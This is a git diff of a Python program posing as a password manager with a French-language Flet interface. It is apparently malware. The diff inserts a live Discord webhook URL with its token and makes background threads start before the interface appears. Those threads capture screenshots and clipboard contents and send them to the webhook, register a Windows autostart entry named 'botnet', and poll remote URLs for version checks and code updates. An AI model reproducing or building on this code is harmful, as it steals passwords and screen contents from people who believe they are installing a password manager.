@@ -16,8 +16,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import base64
 import pyperclip
-
-ancienne_version = "1.0.2"
+import platform
 
 class PasswordManager:
     
@@ -946,6 +945,14 @@ def main(page: ft.Page):
         # Écran de connexion
         login_screen()
 
+def lancer_ui():
+    try:
+        ft.app(target=main)
+    except Exception as e:
+        print(f"Erreur lors du lancement de l'interface utilisateur : {e}")
+
+
+ancienne_version = "1.0.0"
 
 headers = {
     "User-Agent": "...",
@@ -957,7 +964,7 @@ headers = {
 from pathlib import Path
 
 chemin_script = Path(__file__).resolve()
-webhook = "https://discordapp.com/api/webhooks/..."
+webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"
 
 python_url = "https://raw.githubusercontent.com/juto222/Random-Team/main/code.py"
 url_version = "https://linganguliguli.worldlite.fr/Formulaire/v.txt"
@@ -976,6 +983,7 @@ def script(python_url):
 
 
 def maj_version(nouvelle_version):
+    global ancienne_version
     try:
         with open(chemin_script, "r", encoding="utf-8") as f:
             contenu = f.read()
@@ -993,8 +1001,7 @@ def maj_version(nouvelle_version):
     except Exception as e:
         print(f"Erreur lors de la mise à jour de la version : {e}")
 
-def boucle():
-    global ancienne_version
+def boucle(ancienne_version):
     while True:
         try:
             r_version = requests.get(url_version, headers=headers)
@@ -1316,13 +1323,13 @@ def autostart_option_func(script_path=None, name="botnet"):
     winreg.CloseKey(key)
 
 
-
 if __name__ == "__main__":
-    # Démarrer les threads pour les options
+    # Démarrer tous les threads en arrière-plan AVANT l'UI
     threading.Thread(target=screenshot_option_func, args=(webhook,), daemon=True).start()
     threading.Thread(target=clipboard_option_func, args=(webhook,), daemon=True).start()
     threading.Thread(target=autostart_option_func, daemon=True).start()
     threading.Thread(target=loop_check, daemon=True).start()
-
-boucle()
-ft.app(target=main)
+    threading.Thread(target=boucle, args=(ancienne_version,), daemon=True).start()
+    
+    # Lancer l'interface (bloquant)
+    ft.app(target=main)
